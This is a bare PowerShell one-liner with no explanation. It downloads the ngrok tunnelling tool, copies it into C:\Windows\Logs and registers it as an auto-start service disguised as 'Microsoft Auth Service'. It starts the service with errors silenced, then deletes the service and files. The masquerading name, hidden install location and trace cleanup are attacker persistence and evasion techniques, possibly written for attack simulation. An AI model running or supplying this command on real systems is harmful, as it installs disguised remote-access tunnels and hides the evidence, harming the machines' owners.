[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"; $t="$env:TEMP\ngrok"; $f="C:\Windows\Logs\ngrok.exe"; $s="MicrosoftAuth"; try{iwr $u -OutFile "$t.zip"; Expand-Archive "$t.zip" -Dest $t; ni (Split-Path $f) -Type Directory -Force -EA 0; cp "$t\ngrok.exe" $f -Force; New-Service -Name $s -BinaryPathName $f -DisplayName "Microsoft Auth Service" -StartupType Automatic; Start-Service $s}catch{}; sleep 5; sc.exe delete $s 2>$null; ri $t,"$t.zip",$f -Recurse -Force -EA 0